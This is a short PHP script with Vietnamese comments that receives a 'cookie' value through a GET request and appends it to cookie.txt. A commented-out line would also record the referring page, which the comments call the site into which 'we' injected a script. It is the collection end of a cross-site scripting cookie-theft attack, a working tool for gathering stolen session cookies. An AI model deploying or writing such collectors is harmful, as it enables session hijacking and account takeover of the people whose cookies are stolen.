<?php
    if(isset($_GET['cookie']))
    {
        $cookie = $_GET['cookie'];
        // Mở file cookie.txt, tham số a nghĩa là file này mở chỉ để
        $f=fopen('cookie.txt','a');
        // Ta write địa chỉ trang web mà ở trang đó bị ta chèn script.
        // fwrite($f,$_SERVER['HTTP_REFERER']);
        // Ghi giá trị cookie
        fwrite($f,$cookie."\n");
        // Đóng file lại
        fclose($f);
    }
?>